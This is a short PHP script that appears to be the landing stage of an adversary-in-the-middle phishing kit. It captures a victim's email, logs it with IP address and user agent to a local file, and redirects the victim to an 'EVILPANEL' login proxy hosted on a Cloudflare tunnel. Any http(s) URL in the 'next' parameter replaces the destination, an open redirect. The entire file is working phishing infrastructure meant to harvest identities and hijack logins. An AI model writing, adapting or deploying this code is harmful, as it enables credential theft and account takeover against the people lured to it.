<?php
session_start();

$email = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
} elseif (isset($_GET['email'])) {
    $email = $_GET['email'];
}

$email = filter_var($email, FILTER_SANITIZE_EMAIL);

$next = $_GET['next'] ?? '';
$next = filter_var($next, FILTER_SANITIZE_URL);

if ($email) {
    $_SESSION['captured_email'] = $email;
    $log = [
        'timestamp' => date('c'),
        'email' => $email,
        'ip' => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '',
        'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    ];
    file_put_contents(__DIR__ . '/email_captures.json', json_encode($log) . "\n", FILE_APPEND);

    $aitm_url = getenv('EVILPANEL_URL') ?: 'https://argued-wifi-purposes-veterans.trycloudflare.com';
    if ($next && preg_match('#^https?://#', $next)) {
        $aitm_url = $next;
    }

    $redirect = rtrim($aitm_url, '/') . '/login/?email=' . urlencode($email);
    header('Location: ' . $redirect);
    exit;
}

http_response_code(400);
echo "Missing or invalid email.";

